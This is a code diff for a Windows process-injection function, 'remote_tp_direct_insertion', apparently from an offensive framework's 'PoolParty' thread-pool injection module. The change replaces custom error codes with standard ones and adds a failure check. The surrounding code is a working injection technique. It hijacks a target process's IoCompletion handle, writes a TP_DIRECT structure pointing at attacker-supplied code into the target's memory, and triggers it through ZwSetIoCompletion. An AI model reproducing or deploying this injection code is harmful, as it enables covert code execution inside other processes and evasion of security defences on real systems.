@@ -202,43 +202,45 @@ DWORD remote_tp_direct_insertion(HANDLE hProcess, DWORD dwDestinationArch, LPVOI
 	HANDLE hHijackHandle = INVALID_HANDLE_VALUE;
 	ULONG dwInformationSizeIn = 1;
 	ULONG dwInformationSizeOut = 0;
-	DWORD dwResult = ERROR_POOLPARTY_GENERIC;
+	DWORD dwResult = ERROR_INVALID_FUNCTION;
 	HANDLE hHeap = GetProcessHeap();
 	LPVOID *lpDirect = NULL;
 
 	do {
 		GetOrInitNtDll();
 		if (pNtDll == NULL) {
-			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][remote_tp_direct_insertion] Cannot GetOrInitNtDll()", ERROR_POOLPARTY_GENERIC);
+			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][remote_tp_direct_insertion] Cannot GetOrInitNtDll()", ERROR_INVALID_FUNCTION);
 		}
 		if (dwDestinationArch != PROCESS_ARCH_X64) {
-			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][remote_tp_direct_insertion] Currently only x86-64 destination arch is supported.", ERROR_POOLPARTY_VARIANT_FAILED);
+			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][remote_tp_direct_insertion] Currently only x86-64 destination arch is supported.", ERROR_NOT_SUPPORTED);
 		}
 		if (!poolLifeguard->variants[POOLPARTY_TECHNIQUE_TP_DIRECT_INSERTION].isInjectionSupported) {
-			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][remote_tp_direct_insertion] This variant is not supported in this system.", ERROR_POOLPARTY_VARIANT_FAILED)
+			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][remote_tp_direct_insertion] This variant is not supported in this system.", ERROR_NOT_SUPPORTED)
 		}
 		lpDirect = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, TP_DIRECT_STRUCT_SIZE_X64);
 		if(lpDirect == NULL) {
-			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][remote_tp_direct_insertion] This variant is not supported in this system.", ERROR_POOLPARTY_VARIANT_FAILED)
+			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][remote_tp_direct_insertion] This variant is not supported in this system.", ERROR_OUTOFMEMORY)
 		}
 		hHijackHandle = GetRemoteHandle(hProcess, L"IoCompletion", IO_COMPLETION_ALL_ACCESS);
 
 		if (hHijackHandle == INVALID_HANDLE_VALUE) {
-			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][remote_tp_direct_insertion] Unable to locate IoCompletion object inside the target process.", ERROR_POOLPARTY_VARIANT_FAILED)
+			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][remote_tp_direct_insertion] Unable to locate IoCompletion object inside the target process.", ERROR_NOT_SUPPORTED)
 		}
 
 		if (hHijackHandle != INVALID_HANDLE_VALUE) {
 			*(QWORD*)((BYTE*)lpDirect + TP_DIRECT_STRUCT_CB_OFFSET_X64) = (QWORD) lpStartAddress;
 			LPVOID RemoteDirectAddress = VirtualAllocEx(hProcess, NULL, TP_DIRECT_STRUCT_SIZE_X64, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 			if (!RemoteDirectAddress) {
-				BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][remote_tp_direct_insertion] Unable to allocate RemoteDirectAddress.", ERROR_POOLPARTY_VARIANT_FAILED)
+				BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][remote_tp_direct_insertion] Unable to allocate RemoteDirectAddress.", ERROR_NOT_SUPPORTED)
 			}
 			if (!WriteProcessMemory(hProcess, RemoteDirectAddress, lpDirect, TP_DIRECT_STRUCT_SIZE_X64, NULL)) {
-				BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][remote_tp_direct_insertion] Unable to write target process memory.", ERROR_POOLPARTY_VARIANT_FAILED)
+				BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][remote_tp_direct_insertion] Unable to write target process memory.", ERROR_NOT_SUPPORTED)
 			}
 			dwResult = pNtDll->pZwSetIoCompletion(hHijackHandle, RemoteDirectAddress, lpParameter, 0, 0);
 			dprintf("[INJECT][inject_via_poolparty][remote_tp_wait_insertion] ZwSetIoCompletion: %d", dwResult);
-			dwResult = ERROR_SUCCESS;
+			if(dwResult != 0) {
+				BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][remote_tp_wait_insertion] ZwSetIoCompletion failed.", ERROR_NOT_SUPPORTED);
+			}
 		}
 	} while (0);
 	if(lpDirect != NULL) {
